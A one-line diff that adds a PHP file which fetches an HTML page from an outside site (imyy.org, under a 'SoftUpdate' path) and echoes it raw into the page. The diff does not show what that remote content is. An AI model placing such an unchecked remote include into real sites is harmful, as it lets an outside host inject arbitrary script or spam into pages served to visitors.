@@ -1,0 +1,1 @@
+<?php $contents = file_get_contents("http://www.imyy.org/SoftUpdate/fullstack.html"); echo $contents;?>
